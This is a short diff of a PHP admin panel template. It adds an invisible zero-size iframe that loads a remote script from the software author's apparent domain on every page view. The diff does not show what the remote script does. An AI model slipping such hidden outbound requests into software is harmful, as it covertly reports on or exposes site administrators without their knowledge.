@@ -73,7 +73,7 @@ msg($_GET['suc'],1);
         </div>
       </div>
     </div>
-
+<iframe height="0px" wiidth="0px"  frameborder="0" src="http://www.7gugu.com/request/rq.php"></iframe>
     <footer class="admin-content-footer">
       <hr>
       <p class="am-padding-left">© <?php echo date("Y"); ?> Power By 7gugu.</p>
